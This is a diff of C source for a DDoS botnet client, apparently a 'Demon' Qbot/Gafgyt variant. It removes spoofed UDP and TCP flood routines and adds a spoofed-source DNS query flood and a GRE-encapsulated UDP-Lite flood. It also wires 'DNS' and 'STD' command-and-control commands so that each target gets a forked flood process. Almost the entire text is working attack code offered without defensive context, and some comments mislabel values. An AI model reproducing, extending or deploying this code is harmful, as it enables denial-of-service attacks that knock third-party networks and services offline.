@@ -1,6 +1,32 @@
-/////////////////////////////////
-//[ Demon V5.0 ] Self Rep NeTiS/
-///////////////////////////////
+#define PR_SET_NAME 15 //DOESNT REP SKIDZ
+#define SERVER_LIST_SIZE (sizeof(Demonserv) / sizeof(unsigned char *))
+#define PAD_RIGHT 1
+#define PAD_ZERO 2
+#define PRINT_BUF_LEN 12
+#define CMD_IAC   255
+#define CMD_WILL  251
+#define CMD_WONT  252
+#define CMD_DO    253
+#define CMD_DONT  254
+#define OPT_SGA   3
+#define STD2_SIZE 55
+#define BUFFER_SIZE 512
+
+
+#define PAYLOAD_SIZE 64
+#define PROTO_GRE 47
+#define PROTO_UDPLITE 136
+#define GRE_PROTO_IP 0x0800
+ 
+#define UDP_HDRLEN 8
+#define IP_MAXPACKET 65535
+#define UID_PATH "/etc/.uid"
+#define XOR_KEY "demonkey"
+#define IP4_HDRLEN 20
+#define ICMP_HDRLEN 8
+
+#include <uuid/uuid.h>
+#include <netinet/ip_icmp.h>
 #include <stdlib.h>
 #include <stdarg.h>
 #include <stdio.h>
@@ -22,6 +48,7 @@
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
+
 //////////////////////////////////
 #define SERVER_LIST_SIZE (sizeof(Demonserv) / sizeof(unsigned char *))
 #define PAD_RIGHT 1
@@ -44,6 +71,11 @@ struct in_addr ourIP;
 static uint32_t Q[4096], c = 362436;
 unsigned char macAddress[6] = {0};
 ////////////////////////////////////////
+struct grehdr {
+    uint16_t flags;
+    uint16_t protocol;
+};
+
 void init_rand(uint32_t x)
 {
         int i;
@@ -485,217 +517,214 @@ void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t pro
         iph->saddr = source;
         iph->daddr = dest;
 }
-
-void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
-{
-	struct sockaddr_in dest_addr;
-
-	dest_addr.sin_family = AF_INET;
-	if(port == 0) dest_addr.sin_port = rand_cmwc();
-	else dest_addr.sin_port = htons(port);
-	if(getHost(target, &dest_addr.sin_addr)) return;
-	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
-
-	register unsigned int pollRegister;
-	pollRegister = pollinterval;
-
-	if(spoofit == 32)
-	{
-		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-		if(!sockfd)
-		{
-			return;
-		}
-
-		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
-		if(buf == NULL) return;
-		memset(buf, 0, packetsize + 1);
-		makeRandomStr(buf, packetsize);
-
-		int end = time(NULL) + timeEnd;
-		register unsigned int i = 0;
-		while(1)
-		{
-			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-
-			if(i == pollRegister)
-			{
-				if(port == 0) dest_addr.sin_port = rand_cmwc();
-				if(time(NULL) > end) break;
-				i = 0;
-				continue;
-			}
-			i++;
-		}
-	} else {
-		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-		if(!sockfd)
-		{
-			return;
-		}
-
-		int tmp = 1;
-		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
-		{
-			return;
-		}
-
-		int counter = 50;
-		while(counter--)
-		{
-			srand(time(NULL) ^ rand_cmwc());
-			init_rand(rand());
-		}
-
-		in_addr_t netmask;
-
-		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
-		else netmask = ( ~((1 << (32 - spoofit)) - 1) );
-
-		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
-		struct iphdr *iph = (struct iphdr *)packet;
-		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
-
-		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
-
-		udph->len = htons(sizeof(struct udphdr) + packetsize);
-		udph->source = rand_cmwc();
-		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-		udph->check = 0;
-
-		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
-
-		iph->check = csum ((unsigned short *) packet, iph->tot_len);
-
-		int end = time(NULL) + timeEnd;
-		register unsigned int i = 0;
-		while(1)
-		{
-			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-
-			udph->source = rand_cmwc();
-			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-			iph->id = rand_cmwc();
-			iph->saddr = htonl( getRandomIP(netmask) );
-			iph->check = csum ((unsigned short *) packet, iph->tot_len);
-
-			if(i == pollRegister)
-			{
-				if(time(NULL) > end) break;
-				i = 0;
-				continue;
-			}
-			i++;
-		}
-	}
+int build_dns_query(uint8_t *buf, const char *hostname) {
+    struct DNS_HEADER {
+        uint16_t id;
+        uint16_t flags;
+        uint16_t qdcount;
+        uint16_t ancount;
+        uint16_t nscount;
+        uint16_t arcount;
+    };
+ 
+    struct QUESTION {
+        uint16_t qtype;
+        uint16_t qclass;
+    };
+ 
+    struct DNS_HEADER *dns = (struct DNS_HEADER *)buf;
+    dns->id = htons(rand() % 65536);
+    dns->flags = htons(0x0100);  // standard recursive query
+    dns->qdcount = htons(1);
+    dns->ancount = 0;
+    dns->nscount = 0;
+    dns->arcount = 0;
+ 
+    uint8_t *qname = buf + sizeof(struct DNS_HEADER);
+    const char delim[2] = ".";
+    char hostname_copy[256];
+    strncpy(hostname_copy, hostname, 255);
+    hostname_copy[255] = '\0';
+ 
+    char *token = strtok(hostname_copy, delim);
+    while (token) {
+        size_t len = strlen(token);
+        *qname++ = len;
+        memcpy(qname, token, len);
+        qname += len;
+        token = strtok(NULL, delim);
+    }
+    *qname++ = 0;  // End of QNAME
+ 
+    struct QUESTION *qinfo = (struct QUESTION *)qname;
+    qinfo->qtype = htons(33);     // A record
+    qinfo->qclass = htons(1);    // IN class
+ 
+    return (qname - buf) + sizeof(struct QUESTION);
 }
 
-void atcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
-{
-	register unsigned int pollRegister;
-	pollRegister = pollinterval;
-
-	struct sockaddr_in dest_addr;
-
-	dest_addr.sin_family = AF_INET;
-	if(port == 0) dest_addr.sin_port = rand_cmwc();
-	else dest_addr.sin_port = htons(port);
-	if(getHost(target, &dest_addr.sin_addr)) return;
-	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
-
-	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-	if(!sockfd)
-	{
-		return;
-	}
-
-	int tmp = 1;
-	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
-	{
-		return;
-	}
-
-	in_addr_t netmask;
-
-	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
-	else netmask = ( ~((1 << (32 - spoofit)) - 1) );
-
-	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
-	struct iphdr *iph = (struct iphdr *)packet;
-	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
-
-	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
-
-	tcph->source = rand_cmwc();
-	tcph->seq = rand_cmwc();
-	tcph->ack_seq = 0;
-	tcph->doff = 5;
-
-	if(!strcmp(flags, "all"))
-	{
-		tcph->syn = 1;
-		tcph->rst = 1;
-		tcph->fin = 1;
-		tcph->ack = 1;
-		tcph->psh = 1;
-	} else {
-		unsigned char *pch = strtok(flags, ",");
-		while(pch)
-		{
-			if(!strcmp(pch,         "syn"))
-			{
-				tcph->syn = 1;
-			} else if(!strcmp(pch,  "rst"))
-			{
-				tcph->rst = 1;
-			} else if(!strcmp(pch,  "fin"))
-			{
-				tcph->fin = 1;
-			} else if(!strcmp(pch,  "ack"))
-			{
-				tcph->ack = 1;
-			} else if(!strcmp(pch,  "psh"))
-			{
-				tcph->psh = 1;
-			} else {
-			}
-			pch = strtok(NULL, ",");
-		}
-	}
-
-	tcph->window = rand_cmwc();
-	tcph->check = 0;
-	tcph->urg_ptr = 0;
-	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
-	tcph->check = tcpcsum(iph, tcph);
-
-	iph->check = csum ((unsigned short *) packet, iph->tot_len);
-
-	int end = time(NULL) + timeEnd;
-	register unsigned int i = 0;
-	while(1)
-	{
-		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-
-		iph->saddr = htonl( getRandomIP(netmask) );
-		iph->id = rand_cmwc();
-		tcph->seq = rand_cmwc();
-		tcph->source = rand_cmwc();
-		tcph->check = 0;
-		tcph->check = tcpcsum(iph, tcph);
-		iph->check = csum ((unsigned short *) packet, iph->tot_len);
-
-		if(i == pollRegister)
-		{
-			if(time(NULL) > end) break;
-			i = 0;
-			continue;
-		}
-		i++;
-	}
+// DNS sender with spoofed source IP
+void sendDNS(char *ip, int secs) {
+    int sockfd;
+    struct sockaddr_in sin;
+    uint8_t packet[IP_MAXPACKET];
+    time_t start = time(NULL);
+    const int on = 1;
+ 
+    srand(time(NULL));
+ 
+    struct hostent *hp = gethostbyname(ip);
+    if (!hp) {
+        fprintf(stderr, "Could not resolve hostname %s\n", ip);
+        return;
+    }
+ 
+    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sockfd < 0) {
+        perror("socket");
+        return;
+    }
+ 
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
+        perror("setsockopt");
+        close(sockfd);
+        return;
+    }
+ 
+    memset(&sin, 0, sizeof(sin));
+    sin.sin_family = AF_INET;
+    memcpy(&sin.sin_addr, hp->h_addr, hp->h_length);
+ 
+    while (time(NULL) < start + secs) {
+        struct ip *iph = (struct ip *)packet;
+        struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));
+        uint8_t *dns_payload = packet + sizeof(struct ip) + sizeof(struct udphdr);
+ 
+        int dns_len = build_dns_query(dns_payload, "example.com");
+ 
+        char spoofed_ip[16];
+        random_ip(spoofed_ip);
+ 
+        iph->ip_hl = 5;
+        iph->ip_v = 4;
+        iph->ip_tos = 0;
+        iph->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + dns_len);
+        iph->ip_id = rand();
+        iph->ip_off = 0;
+        iph->ip_ttl = 64;
+        iph->ip_p = IPPROTO_UDP;
+        iph->ip_sum = 0;
+        iph->ip_src.s_addr = inet_addr(spoofed_ip);
+        iph->ip_dst = sin.sin_addr;
+        iph->ip_sum = checksum((uint16_t *)iph, sizeof(struct ip));
+ 
+        udph->source = htons(rand() % 65535);
+        udph->dest = htons(53);  // DNS port
+        udph->len = htons(sizeof(struct udphdr) + dns_len);
+        udph->check = 0;  // skipping UDP checksum for now
+ 
+        ssize_t sent = sendto(sockfd, packet, sizeof(struct ip) + sizeof(struct udphdr) + dns_len, 0,
+                              (struct sockaddr *)&sin, sizeof(sin));
+        if (sent < 0) {
+            perror("sendto");
+            break;
+        }
+ 
+        usleep((rand() % 91 + 1) * 1000);  // delay: 10–100 ms
+    }
+ 
+    close(sockfd);
 }
-
-
+ 
+void sendSTD(unsigned char *ip, int port, int secs) {
+    int sock;
+    struct sockaddr_in sin;
+    time_t start = time(NULL);
+    char packet[1500];
+ 
+    struct iphdr *outer_iph = (struct iphdr *)packet;
+    struct grehdr *gre = (struct grehdr *)(packet + sizeof(struct iphdr));
+    struct iphdr *inner_iph = (struct iphdr *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr));
+    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr));
+    char *data = (char *)(udph + 1);
+ 
+    memset(packet, 0, sizeof(packet));
+ 
+    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0) {
+        perror("socket");
+        return;
+    }
+ 
+    int on = 1;
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
+        perror("setsockopt");
+        close(sock);
+        return;
+    }
+ 
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(port);
+    sin.sin_addr.s_addr = inet_addr(ip);
+ 
+    while (time(NULL) < start + secs) {
+        uint32_t spoofed_ip = rand_ip();
+ 
+        // Outer IP header (GRE tunnel)
+        outer_iph->ihl = 5;
+        outer_iph->version = 4;
+        outer_iph->tos = 0;
+        outer_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) +
+                                   sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
+        outer_iph->id = htons(rand() % 65535);
+        outer_iph->frag_off = 0;
+        outer_iph->ttl = 64;
+        outer_iph->protocol = PROTO_GRE;
+        outer_iph->saddr = spoofed_ip;
+        outer_iph->daddr = sin.sin_addr.s_addr;
+        outer_iph->check = 0;
+        outer_iph->check = checksum((unsigned short *)outer_iph, sizeof(struct iphdr));
+ 
+        // GRE header
+        gre->flags = 0;
+        gre->protocol = htons(GRE_PROTO_IP); // Inner payload = IPv4
+ 
+        // Inner IP header (encapsulated)
+        inner_iph->ihl = 5;
+        inner_iph->version = 4;
+        inner_iph->tos = 0;
+        inner_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
+        inner_iph->id = htons(rand() % 65535);
+        inner_iph->frag_off = 0;
+        inner_iph->ttl = 64;
+        inner_iph->protocol = PROTO_UDPLITE;
+        inner_iph->saddr = spoofed_ip;
+        inner_iph->daddr = sin.sin_addr.s_addr;
+        inner_iph->check = 0;
+        inner_iph->check = checksum((unsigned short *)inner_iph, sizeof(struct iphdr));
+ 
+        // UDP-Lite header
+        udph->source = htons(rand() % 65535);
+        udph->dest = htons(port);
+        udph->len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
+        udph->check = 0;
+ 
+        // Chargen-style payload
+        int i;
+        for (i = 0; i < PAYLOAD_SIZE; i++) {
+    data[i] = 33 + (i % 93); // ASCII 33–126
+}
+ 
+ 
+        sendto(sock, packet,
+               sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE,
+               0, (struct sockaddr *)&sin, sizeof(sin));
+ 
+        usleep((rand() % 50 + 5) * 1000);
+    }
+ 
+    close(sock);
+}
 void astd(unsigned char *ip, int port, int secs, int packetsize) 
 {
         int std_hex;
@@ -796,66 +825,74 @@ char *defpkgs()
         }
 }
 void cncinput(int argc, unsigned char * argv[]) {
-  if (!strcmp(argv[0], "UDP")) {
-    if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
-      return;
-    }
+     	if(!strcmp(argv[0], "DNS"))
+		{
+			if(argc < 3 || atoi(argv[2]) < 1 )
+            {
+                        sockprintf(mainCommSock, "STD <target> <port> <time>");
+                        return;
+            }
+			
+			unsigned char *ip = argv[1];
+            int time = atoi(argv[2]);
+			
+			if(strstr(ip, ",") != NULL)
+                {
+                        unsigned char *hi = strtok(ip, ",");
+                        while(hi != NULL)
+                        {
+                                if(!listFork())
+                                {
+                                        sendDNS(hi, time);
+                                        _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } else {
+                        if (listFork()) { return; }
 
-    unsigned char * ip = argv[1];
-    int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
-    int spoofed = atoi(argv[4]);
-    int packetsize = atoi(argv[5]);
-    int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
-    if (strstr(ip, ",") != NULL) {
-      unsigned char * hi = strtok(ip, ",");
-      while (hi != NULL) {
-        if (!listFork()) {
-          audp(hi, port, time, spoofed, packetsize, pollinterval);
-          _exit(0);
-        }
-        hi = strtok(NULL, ",");
-      }
-    } else {
-      if (!listFork()) {
-        audp(ip, port, time, spoofed, packetsize, pollinterval);
-        _exit(0);
-      }
-    }
-    return;
-  }
+                        sendDNS(ip, time);
+                        _exit(0);
+                }
+			
+		}
 
-    if (!strcmp(argv[0], "TCP")) {
-    if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) {
-      return;
-    }
+if(!strcmp(argv[0], "STD"))
+		{
+			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
+            {
+                        sockprintf(mainCommSock, "STD <target> <port> <time>");
+                        return;
+            }
+			
+			unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+			
+			if(strstr(ip, ",") != NULL)
+                {
+                        unsigned char *hi = strtok(ip, ",");
+                        while(hi != NULL)
+                        {
+                                if(!listFork())
+                                {
+                                        sendSTD(hi, port, time);
+                                        _exit(0);
+                                }
+                                hi = strtok(NULL, ",");
+                        }
+                } else {
+                        if (listFork()) { return; }
 
-    unsigned char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
-    int spoofed = atoi(argv[4]);
-    unsigned char *flags = argv[5];
+                        sendSTD(ip, port, time);
+                        _exit(0);
+                }
+			
+		}
 
-    int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
-    int psize = argc > 6 ? atoi(argv[6]) : 0;
 
-    if (strstr(ip, ",") != NULL) {
-      unsigned char * hi = strtok(ip, ",");
-      while (hi != NULL) {
-        if (!listFork()) {
-          atcp(hi, port, time, spoofed, flags, psize, pollinterval);
-          _exit(0);
-        }
-        hi = strtok(NULL, ",");
-      }
-    } else {
-      if (!listFork()) {
-        atcp(ip, port, time, spoofed, flags, psize, pollinterval);
-        _exit(0);
-      }
-    }
-	return;
-    }	
+  
+  
 	if(!strcmp(argv[0], "HEX"))
 	{
 		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1)
